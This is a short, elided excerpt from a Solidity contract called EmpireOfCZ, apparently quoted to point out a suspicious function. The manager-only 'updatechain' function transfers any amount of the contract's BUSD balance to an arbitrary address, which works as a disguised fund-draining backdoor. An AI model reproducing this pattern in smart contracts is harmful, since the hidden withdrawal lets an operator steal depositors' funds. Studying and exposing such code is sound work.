...
contract EmpireOfCZ {
    ...
    IERC20 constant BUSD_TOKEN = IERC20(0x413D5452D5b9Cc56A1edeCC55113ebcE9EB7fbdc);
    ...
    function updatechain(address _addr, uint256 _amount) public  returns(address to, uint256 value){
    require(manager == msg.sender);
      uint256 currentBalance = IERC20(BUSD_TOKEN).balanceOf(address(this));
      ...
      IERC20(BUSD_TOKEN).transfer(_addr, _amount);
